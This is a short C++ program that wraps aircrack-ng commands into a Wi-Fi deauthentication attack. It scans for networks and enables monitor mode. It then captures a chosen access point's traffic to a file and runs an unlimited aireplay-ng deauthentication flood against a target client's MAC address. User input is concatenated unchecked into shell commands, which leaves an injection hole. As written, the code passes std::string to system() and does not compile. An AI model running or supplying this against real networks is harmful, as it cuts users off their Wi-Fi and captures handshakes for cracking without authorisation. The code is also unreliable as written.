/*
	Gabriel B.
	11/09/16
*/

#include <iostream>
#include <stdlib.h>
using namespace std;

int main(){
	string net_bssid;
	string net_channel; 

	system("iwconfig");
	system("ifconfig wlan0 up");  
	system("iwlist wlan0 scanning");
	cout << "-------------------------------------------------------" << endl;
	cout << "network bssid: "; cin >> net_bssid;//network bssid 
	cout << "network channel: "; cin >> net_channel;//network channel 4, 6, etc

	system("airmon-ng check kill");  //killing existing processes
	system("airmon-ng start wlan0"); //starting the interface

	string airodump = "airodump-ng wlan0mon --bssid " + net_bssid;
	airodump += " --channel " + net_channel + " --write svs";
	system(airodump);

	cout << "-------------------------------------------------------" << endl;

	string target_mac;
	cout << "target mac: "; cin >> target_mac;
	string aireplay = "aireplay-ng -0 0 -a " + net_bssid;
	aireplay += " -c " + target_mac + " wlan0mon";
	system(aireplay);

	return 0;

}
